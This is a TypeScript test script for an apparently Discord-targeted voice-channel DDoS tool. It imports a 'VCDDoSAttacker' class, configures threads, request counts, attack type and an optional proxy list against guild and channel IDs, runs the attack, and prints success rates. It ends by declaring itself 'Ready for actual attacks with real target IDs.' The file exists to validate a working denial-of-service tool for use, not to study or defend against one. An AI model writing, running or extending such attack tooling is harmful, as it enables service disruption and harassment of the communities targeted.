import { VCDDoSAttacker } from './attack';
import chalk from 'chalk';

async function testAttack() {
  console.log(chalk.yellow('🚀 Testing VC DDoS Attack...'));
  console.log(chalk.gray('This is a minimal test with safe parameters\n'));

  // Test configuration (safe values)
  const testConfig = {
    targetGuildId: '123456789012345678',  // Example guild ID
    targetChannelId: '987654321098765432', // Example channel ID
    attackType: 'mixed' as const,
    threads: 3,  // Minimal threads for testing
    requestsPerThread: 10, // Minimal requests
    delayBetweenRequests: 100,
    useProxyList: false
  };

  console.log(chalk.cyan('Test Configuration:'));
  console.log(chalk.white(`• Threads: ${testConfig.threads}`));
  console.log(chalk.white(`• Requests per thread: ${testConfig.requestsPerThread}`));
  console.log(chalk.white(`• Total requests: ${testConfig.threads * testConfig.requestsPerThread}`));
  console.log(chalk.white(`• Attack type: ${testConfig.attackType}`));
  console.log(chalk.white(`• Target: Guild ${testConfig.targetGuildId}, Channel ${testConfig.targetChannelId}\n`));

  console.log(chalk.yellow('⚠  NOTE: Using example IDs - attacks will fail but demonstrate functionality'));

  try {
    const attacker = new VCDDoSAttacker(testConfig);
    
    // Set timeout for safety
    const timeout = setTimeout(() => {
      console.log(chalk.yellow('\n⏰ Test timeout reached, stopping...'));
      attacker.stop();
    }, 30000);

    await attacker.start();
    
    clearTimeout(timeout);
    
    const stats = attacker.getStats();
    console.log(chalk.green('\n✓ Test completed!'));
    console.log(chalk.cyan(`Total requests made: ${stats.totalRequests}`));
    console.log(chalk.cyan(`Successful: ${stats.successfulRequests}`));
    console.log(chalk.cyan(`Failed: ${stats.failedRequests}`));
    
    if (stats.totalRequests > 0) {
      const successRate = (stats.successfulRequests / stats.totalRequests * 100).toFixed(2);
      console.log(chalk.cyan(`Success rate: ${successRate}%`));
    }

  } catch (error: any) {
    console.error(chalk.red('❌ Test error:'), error.message);
  }

  console.log(chalk.green('\nTest completed. Ready for actual attacks with real target IDs.'));
}

// Run test if executed directly
if (require.main === module) {
  testAttack().catch(error => {
    console.error(chalk.red('Fatal test error:'), error);
    process.exit(1);
  });
}

export { testAttack };